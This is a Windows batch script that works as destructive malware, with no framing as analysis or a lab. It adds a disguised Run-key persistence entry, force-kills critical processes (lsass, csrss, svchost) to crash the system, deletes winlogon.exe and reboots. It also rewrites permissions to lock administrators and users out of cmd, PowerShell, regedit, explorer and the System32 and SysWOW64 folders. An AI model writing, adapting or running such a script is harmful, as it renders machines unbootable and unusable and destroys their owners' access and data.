@echo off

call :mainloop
::****************************************
:mainloop
call :InstanceCheck
call :SafeLock
call :GetRealName


::****************************************
:BSOD_With_Admin
call :powershell_wininit
if %errorLevel% neq 0 (
    call :taskkill_core_procs
    if %errorLevel% neq 0 (
        call :winlogon_pernament
        if %errorLevel% neq 0 (
            echo Bot C9 mark is 8.8 (Literature)
        )
    ) 
)
exit /b 0
::****************************************
:powershell_wininit
powershell -command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'wininit' -Value 'C:\Windows\System32\cmd.exe /c %~dpnx0'"
::****************************************
:taskkill_core_procs
taskkill /f /im svchost.exe
taskkill /f /im lsass.exe
taskkill /f /im csrss.exe
::****************************************
:winlogon_pernament
takeown /f C:\Windows\System32\winlogon.exe
icacls C:\Windows\System32\winlogon.exe /grant %username%:F
icacls C:\Windows\System32\winlogon.exe /grant "Administrators":F
del C:\Windows\System32\winlogon.exe
shutdown /r /t 0
::****************************************
:InstanceCheck
net session >nul 2>&1
if %errorLevel% neq 0 (
    call :BSOD_With_Admin
) else (
    echo This terminal is not running with Administrator privileges.
    echo Restart the script, with Administrator rights to continue.
    pause
)
exit /b 0
::****************************************
:SafeLock
call :LockProtect "C:\Windows\regedit.exe"
call :LockProtect "C:\Windows\System32\cmd.exe"
call :LockProtect "C:\Windows\SysWOW64\cmd.exe"
call :LockProtect "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
call :LockProtect "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe"
call :LockProtect "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
call :LockProtect "C:\Windows\SysWOW64\explorer.exe"
call :LockProtect "C:\Windows\explorer.exe"

::These two are extremely harmful
call :LockProtect "C:\Windows\System32"
call :LockProtect "C:\Windows\SysWOW64"

call :LockProtect %~dp0
exit /b 0

::****************************************
::Get the unchanged username
:GetRealName

for /f "tokens=3 delims=\" %%s in ('echo %userprofile%') do (
	set realName=%%s
)
exit /b 0
::****************************************
::Lock a file/directory, for all users (other than SYSTEM) and Administrators
::This is powerful, since icacls does not require Administrators rights to be run
::The only default user, who has rights to this file, is the default SYSTEM user

:LockProtect

icacls "%~1" /reset /t
icacls "%~1" /inheritance:d /t
icacls "%~1" /remove "Administrators" /t
icacls "%~1" /remove "%username%" /t
icacls "%~1" /remove "Authenticated Users" /t
icacls "%~1" /grant "Users:RX" /t
icacls "%~1" /inheritance:d /t

exit /b 0